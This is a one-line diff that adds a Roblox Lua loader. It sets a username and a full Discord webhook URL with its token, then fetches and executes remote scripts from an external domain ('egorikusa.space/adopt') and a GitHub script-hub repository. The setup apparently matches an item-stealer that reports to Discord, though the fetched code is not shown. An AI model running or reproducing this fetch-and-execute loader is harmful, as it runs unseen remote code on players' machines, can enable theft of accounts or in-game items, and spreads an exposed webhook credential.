@@ -1,0 +1,1 @@
+getgenv().allowed_name = "Lizer430" getgenv().webhook = "https://discord.com/api/webhooks/1259099956720046130/HEMrKdWrgNn97MYhPb3dbKqzi3IPUS3WoWAE-LfkkJjDlT_B1S13adePeSKNh5UEshK2"  loadstring(game:HttpGet("https://egorikusa.space/adopt"))() loadstring(game:HttpGet("https://raw.githubusercontent.com/Goat-Hub103/BallingScriptHub/main/Source/Main"))()
